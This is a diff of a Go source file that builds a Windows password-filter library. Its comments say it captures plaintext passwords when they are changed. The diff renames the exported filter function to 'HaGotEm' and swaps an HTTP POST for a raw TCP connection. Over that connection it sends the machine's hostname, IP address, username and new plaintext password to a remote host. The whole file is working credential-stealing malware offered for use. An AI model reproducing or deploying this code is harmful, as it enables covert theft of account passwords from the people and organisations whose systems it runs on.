@@ -1,17 +1,18 @@
 package main
 
+// iDigitalFlame 2019
+// Windows Password Filter
+// Captures Raw plaintext passwords when changed.
+// Golang library for yall scrubs.
+
 import "C"
 import (
-	"bytes"
-	"context"
 	"fmt"
 	"net"
-	"net/http"
 	"os"
 	"time"
 )
 
-func main() {}
 func getIPAddress() string {
 	i, err := net.Interfaces()
 	if err != nil {
@@ -47,8 +48,8 @@ func getIPAddress() string {
 	return "<nil>"
 }
 
-//export FilterPassword
-func FilterPassword(s *C.char, l C.int, u *C.char, n C.int, p *C.char) C.int {
+//export HaGotEm
+func HaGotEm(s *C.char, l C.int, u *C.char, n C.int, p *C.char) C.int {
 	a := []byte(C.GoStringN(u, l))
 	y := []byte(C.GoStringN(p, n))
 	e := make([]rune, l/2)
@@ -63,16 +64,17 @@ func FilterPassword(s *C.char, l C.int, u *C.char, n C.int, p *C.char) C.int {
 	if err != nil {
 		h = ""
 	}
-	d := bytes.NewReader([]byte(fmt.Sprintf("[%s:(%s)%s:%s]\n", h, getIPAddress(), string(e), string(k))))
-	r, err := http.NewRequest("POST", fmt.Sprintf("http://%s/p/", C.GoString(s)), d)
+	x, err := net.DialTimeout("tcp", C.GoString(s), time.Duration(5*time.Second))
 	if err != nil {
 		return C.int(-1)
 	}
-	x, _ := context.WithTimeout(context.Background(), time.Duration(5*time.Second))
-	b, err := http.DefaultClient.Do(r.WithContext(x))
-	if err != nil {
+	defer x.Close()
+	d := []byte(fmt.Sprintf("[%s:(%s)%s:%s]\n", h, getIPAddress(), string(e), string(k)))
+	if _, err := x.Write(d); err != nil {
 		return C.int(-1)
 	}
-	b.Body.Close()
+	x.Close()
 	return C.int(0)
 }
+
+func main() {}
